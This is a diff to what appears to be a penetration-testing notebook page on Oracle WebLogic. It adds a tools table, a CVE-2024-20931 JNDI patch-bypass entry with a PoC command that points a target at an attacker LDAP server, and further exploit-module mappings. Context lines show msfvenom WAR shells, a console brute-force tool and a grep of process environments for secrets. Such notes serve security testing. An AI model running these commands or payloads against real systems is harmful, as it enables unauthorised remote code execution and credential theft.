@@ -1,3 +1,5 @@
+# WebLogic
+
 #WebLogic #OracleWebLogic #Java #deserialization #T3 #JNDI #webservices
 
 ## What is WebLogic?
@@ -10,6 +12,21 @@ Oracle WebLogic Server — enterprise Java EE application server. Widely deploye
 - Admin console: `http://<target>:7001/console`
 - T3 protocol: same port as HTTP (7001) — used for RMI/JNDI
 - Default domain: `/u01/app/oracle/Middleware/user_projects/domains/`
+
+---
+
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/Scanning/NMAP\|nmap]] | Port/version fingerprint on 7001/7002/5556 |
+| [[Tools/File Transfer/cURL\|cURL]] | Endpoint checks + XMLDecoder/console-bypass RCE PoCs |
+| [[Tools/Remote Access/Netcat\|Netcat]] | T3 handshake probe (`echo "t3 12.2.1" \| nc host 7001`) |
+| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `weblogic_*` deserialization/console-RCE modules |
+| [[Tools/Payloads & Shells/ysoserial\|ysoserial]] | Java gadget payloads for T3/IIOP deserialization |
+| [[Tools/Web/JNDI-Exploit-Kit\|JNDI-Exploit-Kit]] | Malicious LDAP/RMI server for the JNDI-injection CVEs |
+| [[Tools/Auth/Hydra\|Hydra]] | Brute force `/console/j_security_check` |
+| [[Tools/Web/WebLogicPasswordDecryptor\|WebLogicPasswordDecryptor]] | Offline decrypt of `config.xml` `{AES}` secrets via `SerializedSystemIni.dat` |
 
 ---
 
@@ -42,6 +59,7 @@ use auxiliary/scanner/http/weblogic_status
 
 | CVE | Affected Versions | Type | Auth |
 |---|---|---|---|
+| CVE-2024-20931 | 12.2.1.3/4, 14.1.1 (post-21839-patch) | T3/IIOP JNDI injection (21839 bypass) → RCE | No |
 | CVE-2023-21839 | 12.2.1.3, 12.2.1.4, 14.1.1.0 | JNDI injection → RCE | No |
 | CVE-2021-2109 | 10.3.6, 12.1.3, 12.2.1.3/4, 14.1.1 | JNDI injection → RCE | No |
 | CVE-2020-14882 | 10.3.6, 12.1.3, 12.2.1.3/4, 14.1.1 | Admin console auth bypass | No |
@@ -182,6 +200,16 @@ python3 CVE-2023-21839.py -ip <target> -port 7001 -ldap ldap://<attacker_ip>:138
 use exploit/multi/http/weblogic_admin_console_jndi_rce
 ```
 
+#### CVE-2024-20931 — 21839 Patch Bypass (new JNDI angle)
+
+If a target is patched against CVE-2023-21839 but not fully updated, CVE-2024-20931 revives the same `weblogic.deployment.jms.ForeignOpaqueReference.getReferent()` sink through a **different attribute**: the malicious JNDI URL is set via the `java.naming.provider.url` environment property, which is initialised *after* the `getReferent` check the 21839 patch added — so the lookup still reaches the attacker's LDAP/RMI server. Same JNDI-Exploit-Kit setup, different bind object/property.
+
+```bash
+# Same malicious JNDI server as above (JNDI-Exploit-Kit), then a 20931-aware sender:
+python3 CVE-2024-20931.py <target> 7001 ldap://<attacker_ip>:1389/Exploit
+#   https://github.com/dinosn/CVE-2024-20931  (bypass PoC)
+```
+
 ### T3 Protocol Deserialization (CVE-2018-2628 / General)
 
 T3 is WebLogic's proprietary protocol for RMI — runs on port 7001 alongside HTTP.
@@ -267,7 +295,8 @@ cat /proc/$(pgrep -f weblogic)/environ | tr '\0' '\n' | grep -i "pass\|secret\|k
 | Setting | Risk |
 |---|---|
 | Old WebLogic version | Multiple unauthenticated RCE CVEs |
-| T3 protocol exposed on internet | Deserialization → RCE |
+| Patched for 21839 but not 20931 | CVE-2024-20931 T3/IIOP JNDI bypass → RCE |
+| T3 protocol exposed on internet | Deserialization → RCE (restrict via connection filters) |
 | Admin console on port 7001 accessible | Auth bypass CVEs or brute force |
 | Default credentials | Admin → WAR deploy → RCE |
 | `_async` servlet enabled | CVE-2019-2725 |
@@ -286,6 +315,13 @@ cat /proc/$(pgrep -f weblogic)/environ | tr '\0' '\n' | grep -i "pass\|secret\|k
 | CVE-2017-10271 (MSF) | `exploit/multi/http/oracle_weblogic_wsat_deserialization_rce` |
 | CVE-2019-2725 (MSF) | `exploit/multi/http/weblogic_deserialize_asyncresponseservice` |
 | CVE-2020-14882/3 (MSF) | `exploit/multi/http/weblogic_admin_console_handle_rce` |
+| CVE-2023-21839 / CVE-2024-20931 | JNDI-Exploit-Kit LDAP server → `CVE-2023-21839.py` / `CVE-2024-20931.py` |
 | T3 deserialization (MSF) | `exploit/multi/misc/weblogic_deserialize_marshalledobject` |
 | WAR deploy | `msfvenom ... -f war -o shell.war` → admin console deploy |
 | Decrypt passwords | `python3 decrypt.py --key SerializedSystemIni.dat --config config.xml` |
+
+---
+
+*Created: 2026-07-13*
+*Updated: 2026-09-25*
+*Model: claude-opus-4-8*
